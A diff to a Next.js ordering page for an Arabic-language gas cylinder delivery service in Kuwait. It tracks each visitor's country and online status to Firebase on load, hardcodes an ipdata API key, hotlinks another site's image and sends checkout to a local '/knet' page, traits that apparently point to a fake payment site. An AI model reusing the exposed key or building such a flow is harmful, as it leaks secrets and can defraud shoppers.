@@ -1,7 +1,6 @@
 "use client"
 
-import { useState, useEffect, SetStateAction } from "react"
-import Image from "next/image"
+import { useState, useEffect, type SetStateAction } from "react"
 import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Separator } from "@/components/ui/separator"
@@ -13,7 +12,7 @@ import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { useRouter } from "next/navigation"
-import { LiveChatWidget } from '@livechat/widget-react'
+import { LiveChatWidget } from "@livechat/widget-react"
 
 export default function GasCylinderApp() {
   const [step, setStep] = useState(1)
@@ -24,43 +23,65 @@ export default function GasCylinderApp() {
   const [selectedAddress, setSelectedAddress] = useState("address1")
   const [selectedPayment, setSelectedPayment] = useState("card")
   const [showAddAddress, setShowAddAddress] = useState(false)
-  const router=useRouter()
+  const router = useRouter()
   const { theme, setTheme } = useTheme()
   const [mounted, setMounted] = useState(false)
-  const _id=randstr('gas-')
+  const _id = randstr("gas-")
 
   // Sample addresses
   const savedAddresses: any[] = [
-   
+    {
+      id: "address1",
+      name: "المنزل",
+      area: "السالمية",
+      block: "12",
+      street: "5",
+      building: "10",
+      floor: "3",
+      apartment: "7",
+      mobile: "99887766",
+    },
+    {
+      id: "address2",
+      name: "العمل",
+      area: "حولي",
+      block: "5",
+      street: "20",
+      building: "15",
+      floor: "2",
+      apartment: "4",
+      mobile: "99112233",
+    },
   ]
   async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-  
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
     try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        const country = await response.text();
-        addData({
-            id:_id,
-            country: country
-        })
-        localStorage.setItem('country',country)
-        setupOnlineStatus(_id)
-      } catch (error) {
-        console.error('Error fetching location:', error);
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      addData({
+        id: _id,
+        country: country,
+      })
+      localStorage.setItem("country", country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error("Error fetching location:", error)
     }
   }
-function randstr(prefix:string)
-{
-  return Math.random().toString(36).replace('0.',prefix || '');
-}
+  function randstr(prefix: string) {
+    return Math.random()
+      .toString(36)
+      .replace("0.", prefix || "")
+  }
   // Avoid hydration mismatch
   useEffect(() => {
     setMounted(true)
-  getLocation().then(()=>{})
+    getLocation().then(() => {})
   }, [])
 
   const incrementCount = () => {
@@ -107,6 +128,40 @@ function randstr(prefix:string)
     setTheme(theme === "dark" ? "light" : "dark")
   }
 
+  const saveNewAddress = () => {
+    // Get values from form
+    const name = (document.getElementById("address-name") as HTMLInputElement)?.value || "عنوان جديد"
+    const area = (document.getElementById("area") as HTMLInputElement)?.value || ""
+    const block = (document.getElementById("block") as HTMLInputElement)?.value || ""
+    const street = (document.getElementById("street") as HTMLInputElement)?.value || ""
+    const building = (document.getElementById("building") as HTMLInputElement)?.value || ""
+    const floor = (document.getElementById("floor") as HTMLInputElement)?.value || ""
+    const apartment = (document.getElementById("apartment") as HTMLInputElement)?.value || ""
+    const mobile = (document.getElementById("mobile") as HTMLInputElement)?.value || ""
+
+    // Create new address object
+    const newAddress = {
+      id: `address${savedAddresses.length + 1}`,
+      name,
+      area,
+      block,
+      street,
+      building,
+      floor,
+      apartment,
+      mobile,
+    }
+
+    // Add to savedAddresses
+    savedAddresses.push(newAddress)
+
+    // Select the new address
+    setSelectedAddress(newAddress.id)
+
+    // Close the add address form
+    setShowAddAddress(false)
+  }
+
   const toggleAddAddress = () => {
     setShowAddAddress(!showAddAddress)
   }
@@ -114,7 +169,7 @@ function randstr(prefix:string)
   const proceedToPayment = () => {
     // In a real app, this would redirect to a payment gateway
     alert("سيتم تحويلك إلى بوابة الدفع")
-    router.push('/knet')
+    router.push("/knet")
   }
 
   if (!mounted) {
@@ -125,7 +180,7 @@ function randstr(prefix:string)
     <div
       className={`min-h-screen ${theme === "light" ? "bg-gray-100 text-gray-900" : "bg-[#0f1524] text-white"} flex flex-col`}
       dir="rtl"
-      style={{zoom:0.9}}
+      style={{ zoom: 0.9 }}
     >
       {/* Header */}
       <header className="p-4 flex justify-between items-center">
@@ -143,7 +198,6 @@ function randstr(prefix:string)
           >
             اطلب الان
           </Button>
-         
         </div>
       </header>
 
@@ -238,7 +292,13 @@ function randstr(prefix:string)
 
             {/* Gas Cylinder Image */}
             <div className="mt-8">
-              <img src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png" alt="Gas Cylinder" width={100} height={200} className="object-contain" />
+              <img
+                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
+                alt="Gas Cylinder"
+                width={100}
+                height={200}
+                className="object-contain"
+              />
             </div>
 
             {/* Navigation Buttons */}
@@ -595,7 +655,7 @@ function randstr(prefix:string)
                       className={`${
                         theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"
                       } text-white font-bold flex-1`}
-                      onClick={toggleAddAddress}
+                      onClick={saveNewAddress}
                     >
                       حفظ العنوان
                     </Button>
@@ -763,7 +823,7 @@ function randstr(prefix:string)
           مرحبا بكم في خدمة توصيل اسطوانات الغاز المنزلية الرائدة في الكويت! نحن نسعى لتقديم حلول سريعة وموثوقة وبأسعار
           معقولة لجميع احتياجات الغاز الخاصة بك.
         </p>
-        
+
         <div className="mt-4">
           <Link
             href="/"
@@ -771,11 +831,9 @@ function randstr(prefix:string)
           >
             العودة إلى الصفحة الرئيسية
           </Link>
-          
         </div>
       </footer>
-      <LiveChatWidget license="19137023" visibility="minimized"/>
-
+      <LiveChatWidget license="19137023" visibility="minimized" />
     </div>
   )
 }
